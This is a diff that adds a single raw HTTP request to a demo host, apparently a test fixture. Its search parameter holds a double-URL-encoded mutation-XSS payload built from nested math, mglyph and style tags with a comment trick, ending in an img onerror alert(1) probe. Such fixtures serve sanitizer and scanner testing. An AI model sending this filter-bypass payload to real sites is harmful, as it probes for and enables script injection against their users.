@@ -1,0 +1,4 @@
+GET /a?search=%253Cmath%253E%253Cmtext%253E%253Ctable%253E%253Cmglyph%253E%253Cstyle%253E%253C%2521--%253C%252Fstyle%253E%253Cimg%2Bsrc%253D--%2Bonerror%253Dalert%25281%2529%253E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
